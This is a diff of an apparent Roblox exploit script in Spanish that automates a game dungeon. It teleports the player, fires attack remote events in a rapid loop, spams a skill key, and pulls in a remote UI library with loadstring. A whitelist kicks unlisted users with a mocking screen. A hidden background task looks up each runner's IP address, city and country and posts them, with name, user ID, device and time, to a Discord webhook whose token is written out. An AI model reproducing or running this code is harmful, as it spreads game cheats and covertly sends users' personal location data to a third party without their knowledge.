@@ -1,11 +1,11 @@
--- ========================================================================
--- 👑 EDSUSITO DUNGEON PREMIUM - SISTEMA DE LISTA BLANCA TROLL 👑
--- ========================================================================
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- 👑 EDSUSITO PREMIUM - THE MASTERPIECE 👑
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 local UsuariosPermitidos = {
     [7255753286] = true,  -- TW_Calamity
-    [2014903362] = true,  -- Edsusito
-    [8117327541] = true,   -- MC_AleX
+    [2014903362] = true,  -- Edsusito (Creador)
+    [8117327541] = true,  -- MC_AleX
     [000000000] = true,   -- Espacio 4
     [000000000] = true,   -- Espacio 5
     [000000000] = true,   -- Espacio 6
@@ -29,59 +29,61 @@ local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local localPlayer = Players.LocalPlayer
 
--- El candado de seguridad con Pantalla Troll
+-- ◈ Candado de Seguridad
 if not UsuariosPermitidos[localPlayer.UserId] then
     local targetGui = pcall(function() return CoreGui end) and CoreGui or localPlayer:WaitForChild("PlayerGui")
     
     local TrollScreen = Instance.new("ScreenGui")
-    TrollScreen.Name = "EdsusitoTroll"
+    TrollScreen.Name = "EdsusitoSecurity"
     TrollScreen.IgnoreGuiInset = true
     TrollScreen.Parent = targetGui
     
     local Background = Instance.new("Frame")
     Background.Size = UDim2.new(1, 0, 1, 0)
-    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Pantalla negra
+    Background.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
     Background.Parent = TrollScreen
     
     local TrollText = Instance.new("TextLabel")
     TrollText.Size = UDim2.new(0.9, 0, 0.8, 0)
     TrollText.Position = UDim2.new(0.05, 0, 0.1, 0)
     TrollText.BackgroundTransparency = 1
-    TrollText.TextColor3 = Color3.fromRGB(255, 0, 0) -- Texto rojo
+    TrollText.TextColor3 = Color3.fromRGB(220, 40, 40)
     TrollText.TextScaled = true
-    TrollText.Font = Enum.Font.Creepster 
-    TrollText.Text = "Buen intento payaso 🤡\n\nSi me dices quién te lo pasó puede que te haga un descuento :3\n\nSaliendo en: 5"
+    TrollText.Font = Enum.Font.GothamBlack 
+    TrollText.Text = "¿Qué miras? 🤡\n\n¿De verdad creíste que podías usar el código de Edsusito así de fácil?\nDeja de mendigar scripts y compra tu licencia oficial.\n\nExpulsando en: 5"
     TrollText.Parent = Background
 
     task.spawn(function()
         for i = 5, 1, -1 do
-            TrollText.Text = "Buen intento payaso 🤡\n\nSi me dices quién te lo pasó puede que te haga un descuento :3\n\nSaliendo en: " .. i
+            TrollText.Text = "¿Qué miras? 🤡\n\n¿De verdad creíste que podías usar el código de Edsusito así de fácil?\nDeja de mendigar scripts y compra tu licencia oficial.\n\nExpulsando en: " .. i
             task.wait(1)
         end
-        localPlayer:Kick("jeje xD. Compra la licencia oficial.")
+        localPlayer:Kick("Sin licencia no hay script. Habla con Edsu.")
     end)
     
-    return -- Detiene el script para que no cargue la UI ni el webhook si no están en la lista
+    return
 end
 
--- ==========================================================
--- ⚙️ SERVICIOS Y VARIABLES DEL SISTEMA PREMIUM
--- ==========================================================
+print("◈ Bienvenido, " .. localPlayer.DisplayName .. ". Edsusito Premium cargado correctamente. ◈")
+
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- ⚙️ SERVICIOS Y VARIABLES DEL SISTEMA
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
 local justDied = false 
-local attackHeight = 30 
+local attackHeight = 40 -- Altura inicial ajustada
 local selectedWeapon = "Sword" 
 
 local autoDungeonActive = false
 local autoV4Active = false
-local autoBlessingActive = false
 local currentTarget = nil
 local lastTarget = nil 
 
@@ -97,9 +99,9 @@ localPlayer.CharacterAdded:Connect(function(newCharacter)
     justDied = true 
 end)
 
--- ==========================================================
--- 📡 WEBHOOK: EL CHISMOSO PREMIUM (SECRETO)
--- ==========================================================
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- 📡 WEBHOOK: MONITOREO VIP
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 task.spawn(function()
     local WebhookURL = "https://webhook.lewisakura.moe/api/webhooks/1527303066431389796/XMkQJ-N1Y0Fo7Kb23Bod9m2VtZbhHRIGCuCOD4tUJHeHJhaB_TnfRAxogKskRdpExxnn"
     
@@ -109,7 +111,7 @@ task.spawn(function()
     
     local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
     
-    local ipData = { query = "Oculta", country = "N/A" }
+    local ipData = { query = "Oculta", country = "N/A", city = "N/A" }
     pcall(function()
         local response = game:HttpGet("http://ip-api.com/json/")
         if response then
@@ -118,15 +120,18 @@ task.spawn(function()
         end
     end)
     
-    local mensaje = "👑 **EJECUCIÓN PREMIUM DETECTADA - EDSUSITO DUNGEON** 👑\n" ..
+    local horaExacta = os.date("%Y-%m-%d %H:%M:%S")
+
+    local mensaje = "👑 **EJECUCIÓN VIP DETECTADA - EDSUSITO PREMIUM** 👑\n" ..
                     "```yaml\n" ..
-                    "[ 👤 DATOS DEL USUARIO (WHITELIST APROBADO) ]\n" ..
+                    "[ 👤 DATOS DEL USUARIO ]\n" ..
                     "Nombre:      " .. localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")\n" ..
                     "User ID:     " .. tostring(localPlayer.UserId) .. "\n\n" ..
                     "[ 💻 DATOS TÉCNICOS ]\n" ..
                     "Ejecutor:    " .. executorName .. "\n" ..
                     "Dispositivo: " .. dispositivo .. "\n" ..
-                    "IP/País:     " .. ipData.query .. " (" .. ipData.country .. ")\n" ..
+                    "Ubicación:   " .. ipData.city .. ", " .. ipData.country .. " (" .. ipData.query .. ")\n" ..
+                    "Hora:        " .. horaExacta .. "\n" ..
                     "```"
 
     local data = { ["content"] = mensaje }
@@ -137,9 +142,9 @@ task.spawn(function()
     else pcall(function() HttpService:PostAsync(WebhookURL, jsonData) end) end
 end)
 
--- ==========================================================
--- 🗡️ FUNCIONES DE COMBATE Y EQUIPAMIENTO PREMIUM
--- ==========================================================
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- 🗡️ COMBATE Y EQUIPAMIENTO
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 local function GetWeaponInBackpack(weaponName)
     local backpack = localPlayer:FindFirstChildOfClass("Backpack")
     if backpack then
@@ -172,8 +177,23 @@ local function ForceActivateHaki()
     end
 end
 
+-- ◇ AUTO V4 LOOP
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if autoV4Active and autoDungeonActive and character then
+            pcall(function()
+                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Y, false, game)
+                task.wait(0.1)
+                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Y, false, game)
+            end)
+        end
+    end
+end)
+
 local function StartAutoBuffs()
     task.spawn(function()
+        print("◈ Vectores de daño en línea.")
         while autoDungeonActive do
             EquipSelectedWeapon()
             task.wait(0.3)
@@ -187,9 +207,9 @@ local function StartAutoBuffs()
     end)
 end
 
--- ==========================================================
--- 👁️ DETECCIÓN DE ENEMIGOS
--- ==========================================================
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- 👁️ DETECCIÓN DE ENEMIGOS (FIX STAGE 15)
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 local function GetClosestEnemy()
     if justDied then return nil end 
 
@@ -203,12 +223,26 @@ local function GetClosestEnemy()
     local sourceFolder = Workspace:FindFirstChild("Enemies") or enemiesFolder
     
     if sourceFolder then
+        local jefeVivo = false
+        local jefeEncontrado = sourceFolder:FindFirstChild("Gas Knight")
+        if jefeEncontrado then
+            local jefeHumanoid = jefeEncontrado:FindFirstChildOfClass("Humanoid")
+            if jefeHumanoid and jefeHumanoid.Health > 0 then
+                jefeVivo = true
+            end
+        end
+
         local children = sourceFolder:GetChildren()
         local primaryCandidates = {}
         local backupCandidates = {}
         
         for i = 1, #children do
             local object = children[i]
+            
+            if object.Name == "PropHitboxPlaceholder" and not jefeVivo then
+                continue 
+            end
+
             if object:IsA("Model") and object ~= currentCharacter and object.Name ~= "Blank Buddy" and object.Name ~= "Sombra" and object.Name ~= "Shadow" then
                 local humanoid = object:FindFirstChildOfClass("Humanoid")
                 local root = object:FindFirstChild("HumanoidRootPart") or object:FindFirstChild("Head")
@@ -263,15 +297,16 @@ local function AttackEnemy(enemy)
     local tool = character:FindFirstChildOfClass("Tool")
     if tool then tool:Activate() end
     
+    -- Fast Attack optimizado
     pcall(function()
         registerAttack:FireServer(0)
         registerHit:FireServer(enemyHead, {{enemy, enemyHead}})
     end)
 end
 
--- ==========================================================
--- 🚪 SISTEMA DE PROGRESIÓN DE SALAS
--- ==========================================================
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- 🚪 PROGRESIÓN DE SALAS Y ROTACIÓN (FAST ATTACK)
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 local function GetCurrentRoomIndex(rooms)
     if not humanoidRootPart then return 1 end
     local myPos = humanoidRootPart.Position
@@ -341,11 +376,12 @@ local function RotateTargets()
             local enemyHumanoid = currentTarget:FindFirstChildOfClass("Humanoid")
             local timer = 0
             
+            -- Cambio de NPC cada 0.3 segundos con Fast Attack Activo
             while autoDungeonActive and currentTarget and currentTarget.Parent and enemyHumanoid and enemyHumanoid.Health > 0 and timer < 0.3 and not justDied do
                 TeleportToEnemy(currentTarget)
                 AttackEnemy(currentTarget)
                 
-                task.wait(0.01)
+                task.wait() -- Disparo rápido sin delay forzado
                 timer = timer + 0.01
             end
         else
@@ -371,25 +407,25 @@ local function RotateTargets()
     end
 end
 
--- ==========================================================
--- 🎨 INTERFAZ PREMIUM (RAYFIELD)
--- ==========================================================
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+-- 🎨 INTERFAZ GRÁFICA (RAYFIELD)
+-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-    Name = "👑 Edsusito Dungeon Premium 👑",
-    LoadingTitle = "Verificando Licencia...",
+    Name = "👑 Edsusito Premium | The Masterpiece",
+    LoadingTitle = "Cargando código de autor...",
     LoadingSubtitle = "By Edsu",
     ConfigurationSaving = { Enabled = false },
     Discord = { Enabled = false },
     KeySystem = false
 })
 
-local DungeonTab = Window:CreateTab("Dungeon Premium", 4483362458)
-DungeonTab:CreateSection("Control Principal")
+local DungeonTab = Window:CreateTab("Control Dungeon", 4483362458)
 
+DungeonTab:CreateSection("◈ Inicio Rápido")
 DungeonTab:CreateToggle({
-    Name = "Auto Completar Dungeon",
+    Name = "⚡ Iniciar Auto Dungeon",
     CurrentValue = false,
     Flag = "EdsuAutoDungeonFlag",
     Callback = function(Value)
@@ -398,6 +434,7 @@ DungeonTab:CreateToggle({
             justDied = false
             StartAutoBuffs() 
             coroutine.wrap(RotateTargets)()
+            Rayfield:Notify({Title = "Sistema Activo", Content = "Limpieza de sala iniciada.", Duration = 3})
         else
             currentTarget = nil
             lastTarget = nil
@@ -406,10 +443,9 @@ DungeonTab:CreateToggle({
     end,
 })
 
-DungeonTab:CreateSection("Ajustes de Combate Premium")
-
+DungeonTab:CreateSection("◈ Armamento y Distancia")
 DungeonTab:CreateDropdown({
-    Name = "Seleccionar Arma",
+    Name = "⚔️ Arma Seleccionada",
     Options = {"Sword", "Melee", "Blox Fruit"},
     CurrentOption = {"Sword"},
     MultipleOptions = false,
@@ -420,33 +456,26 @@ DungeonTab:CreateDropdown({
 })
 
 DungeonTab:CreateSlider({
-    Name = "Altura de Ataque",
+    Name = "🚁 Altura de Ataque",
     Range = {10, 100}, 
     Increment = 1,
     Suffix = " studs",
-    CurrentValue = 30, 
+    CurrentValue = 40, -- 40 por defecto
     Flag = "AttackHeightFlag",
     Callback = function(Value)
         attackHeight = Value
     end,
 })
 
-DungeonTab:CreateSection("Utilidades Extra")
-
+DungeonTab:CreateSection("◈ Funciones Adicionales")
 DungeonTab:CreateToggle({
-    Name = "Auto V4 (Próximamente)",
+    Name = "🔥 Auto Activar V4",
     CurrentValue = false,
     Flag = "AutoV4Flag",
     Callback = function(Value)
         autoV4Active = Value
-    end,
-})
-
-DungeonTab:CreateToggle({
-    Name = "Auto Cartas/Blessings (Próximamente)",
-    CurrentValue = false,
-    Flag = "AutoBlessingFlag",
-    Callback = function(Value)
-        autoBlessingActive = Value
+        if Value then
+            Rayfield:Notify({Title = "V4 Activo", Content = "Spam de habilidad iniciado.", Duration = 3})
+        end
     end,
 })
